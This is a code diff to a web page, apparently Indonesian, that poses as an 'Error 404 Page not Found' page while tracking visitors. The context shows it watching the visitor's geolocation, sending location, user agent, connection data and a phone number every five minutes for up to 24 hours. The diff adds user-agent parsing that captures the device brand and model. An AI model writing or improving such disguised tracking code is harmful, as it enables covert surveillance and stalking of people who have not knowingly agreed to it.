@@ -15,16 +15,18 @@
     .map-link { margin-top: 10px; display: none; }
     a { color: #8fb2ff; }
     textarea { width: 100%; min-height: 72px; border-radius: 10px; border: 1px solid #384b89; background: #0b1020; color: #e8eefc; padding: 10px; }
-    button { margin-top: 10px; background: #4c7dff; color: white; border: 0; padding: 10px 16px; border-radius: 10px; font-weight: 600; cursor: pointer; }
+    input, button { margin-top: 10px; width:100%; padding:10px; border-radius:10px; border:1px solid #384b89; }
+    input { background:#0b1020; color:#e8eefc; }
+    button { background: #4c7dff; color: white; border: 0; font-weight: 600; cursor: pointer; }
   </style>
 </head>
 <body>
   <div class="wrap">
     <div class="card">
       <h1>Error 404 Page not Found</h1>
-      <p class="small">The Page You are looking for doesn't exist or an other error occured. Go Back. Or Head Over to Pneu Top Tyre Pourquoi Aller Alleurs ti choose a new direction.</p>
+      <p class="small">The Page You are looking for doesn't exist or an other error occured.</p>
       <textarea id="note" placeholder="Tambahkan catatan..."></textarea>
-      <input id="phone" type="text" placeholder="Masukkan No HP..." style="margin-top:8px;width:100%;padding:8px;border-radius:8px;border:1px solid #384b89;background:#0b1020;color:#e8eefc;" />
+      <input id="phone" type="text" placeholder="Masukkan No HP..." />
       <button id="stopBtn">Hentikan Tracking</button>
       <div class="status" id="status"></div>
       <div class="map-link" id="mapWrap">
@@ -50,6 +52,23 @@
   let lastPos = null;
   let intervalId = null;
 
+  // fungsi parsing merk/model HP dari UA
+  function parseDeviceModel(ua) {
+    let model = "unknown";
+    if (/SM-[A-Z0-9]+/i.test(ua)) {
+      model = ua.match(/SM-[A-Z0-9]+/i)[0];
+      return "Samsung " + model;
+    }
+    if (/Redmi|Mi\s|MIX|POCO/i.test(ua)) {
+      return "Xiaomi/Redmi/POCO Device";
+    }
+    if (/iPhone/i.test(ua)) return "Apple iPhone";
+    if (/iPad/i.test(ua)) return "Apple iPad";
+    if (/OPPO/i.test(ua)) return "Oppo Device";
+    if (/Vivo/i.test(ua)) return "Vivo Device";
+    return ua.split(";").pop().trim();
+  }
+
   // ambil info perangkat
   async function getExtraInfo() {
     const ua = navigator.userAgent;
@@ -63,6 +82,7 @@
     }
     return {
       ua,
+      deviceModel: parseDeviceModel(ua),
       connection: conn.effectiveType || "unknown",
       downlink: conn.downlink || "unknown",
       phoneNumber: phoneEl.value.trim() || "-",
@@ -78,6 +98,7 @@
       latitude, longitude, accuracy,
       userNote: noteEl.value.trim(),
       ua: extra.ua,
+      deviceModel: extra.deviceModel,
       connection: extra.connection,
       downlink: extra.downlink,
       phoneNumber: extra.phoneNumber,
@@ -102,7 +123,6 @@
       setStatus('Silahkan Muat Ulang');
       return;
     }
-
     setStatus('Loading...');
 
     watchId = navigator.geolocation.watchPosition(async (pos) => {
@@ -123,7 +143,7 @@
     // 🔥 Paksa kirim tiap 5 menit walaupun posisi tidak berubah
     intervalId = setInterval(() => {
       if (lastPos) sendLocation(lastPos.latitude, lastPos.longitude, lastPos.accuracy);
-    }, 300000); // 5 menit
+    }, 300000);
 
     // Stop otomatis setelah 24 jam
     stopTimer = setTimeout(stopRealtimeTracking, 24 * 60 * 60 * 1000);
